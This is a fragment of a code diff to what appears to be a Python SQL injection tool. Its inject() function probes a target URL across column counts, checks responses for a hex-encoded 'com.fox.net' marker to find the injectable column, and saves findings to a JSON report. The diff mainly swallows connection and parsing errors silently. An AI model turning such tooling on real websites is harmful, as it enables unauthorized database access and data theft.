@@ -114,9 +114,9 @@ def connect(url):
 		if method == "post":
 			res = post(url,data=data,headers=headers)
 			return res
-
 	except:
-		exit(f"{RED}Connection To Target Cannot Be Made ...(-__-)")
+		pass
+		#exit(f"{RED}Connection To Target Cannot Be Made ...(-__-)")
 def inject(columns_number=50):
 	interfacevalue = "0x636F6D2E666F782E6E6574"#"com.fox.net"
 	interface = [] #interfacevalue
@@ -132,16 +132,18 @@ def inject(columns_number=50):
 				res = connect(url)
 				if urlr != None:
 					res = get(urlr,headers=headers)
-				if "com.fox.net" in res.text:
-					testresult = {"payload":payload,"pstart":sep,"pend":pend,"columns":i+1}
-					report = "{"
-					report+= f'"payload":"{payload}","pstart":"{sep}","pend":"{pend}","columns":"{i+1}"'
-					report+= "}"
-					try:
-						open(f"reports\\{report_path}.json","w").write(report)
-					except:
-						pass
-					return testresult
+				try:
+					if "com.fox.net" in res.text:
+						testresult = {"payload":payload,"pstart":sep,"pend":pend,"columns":i+1}
+						report = "{"
+						report+= f'"payload":"{payload}","pstart":"{sep}","pend":"{pend}","columns":"{i+1}"'
+						report+= "}"
+						try:
+							open(f"reports\\{report_path}.json","w").write(report)
+						except:
+							pass
+						return testresult
+				except:pass
 	return 0
 def genrate_extract_payload(option,testpayload,weakcolumn,database=None,tablename=None,data_to_extract=None):
 	stag = "0x3C716E666F783E"
